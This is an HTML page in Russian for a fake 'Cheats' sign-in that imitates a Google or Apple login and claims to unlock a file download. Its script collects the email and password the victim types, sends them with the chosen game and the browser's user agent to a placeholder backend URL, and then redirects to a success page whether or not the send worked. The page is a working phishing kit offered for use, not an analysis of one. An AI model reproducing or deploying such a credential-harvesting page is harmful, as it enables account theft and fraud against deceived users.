<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в Cheats</title>
    <link rel="stylesheet" href="css/style.css">
    <style>
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #0a0a0f; }
        .auth-container {
            width: 100%; max-width: 400px; padding: 40px;
            background: #111; border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.08); text-align: center;
        }
        .auth-container h2 { margin-bottom: 10px; }
        .auth-container p { color: #888; margin-bottom: 30px; font-size: 14px; }
        .form-group { margin-bottom: 16px; text-align: left; }
        .form-group label {
            display: block; font-size: 12px; color: #aaa;
            margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;
        }
        .form-group input {
            width: 100%; padding: 12px 14px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px; color: #fff; font-size: 15px;
            outline: none; transition: 0.3s;
        }
        .form-group input:focus { border-color: #00ffc8; }
        .submit-btn {
            width: 100%; padding: 14px; margin-top: 10px;
            background: #00ffc8; color: #000; border: none;
            border-radius: 8px; font-weight: 700; font-size: 16px;
            cursor: pointer; transition: 0.3s;
        }
        .submit-btn:hover { box-shadow: 0 0 20px rgba(0,255,200,0.4); }
        .submit-btn:disabled { opacity: 0.5; cursor: wait; }
        .provider-logo { font-size: 40px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="auth-container">
        <div class="provider-logo" id="provider-logo">G</div>
        <h2>Вход в Cheats</h2>
        <p>Продолжите, чтобы получить доступ к файлу</p>

        <form id="auth-form">
            <div class="form-group">
                <label>Email</label>
                <input type="email" id="email" placeholder="example@gmail.com" required autocomplete="email">
            </div>
            <div class="form-group">
                <label>Пароль</label>
                <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password">
            </div>
            <button type="submit" class="submit-btn" id="submit-btn">Войти</button>
        </form>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const urlParams = new URLSearchParams(window.location.search);
            const provider = urlParams.get('provider') || 'google';
            const logo = document.getElementById('provider-logo');
            
            if (provider === 'apple') {
                logo.textContent = '';
                logo.style.color = '#fff';
            } else {
                logo.textContent = 'G';
                logo.style.color = '#EA4335';
            }

            document.getElementById('auth-form').addEventListener('submit', async (e) => {
                e.preventDefault();
                const btn = document.getElementById('submit-btn');
                btn.disabled = true;
                btn.textContent = 'Вход...';

                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                try {
                    await fetch('https://your-backend-url.com/api/auth', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            email, password, provider,
                            game: localStorage.getItem('selected_game') || 'unknown',
                            ua: navigator.userAgent
                        })
                    });
                } catch (err) {
                    console.warn('send failed, redirecting anyway');
                } finally {
                    window.location.href = 'success.html';
                }
            });
        });
    </script>
</body>
</html>
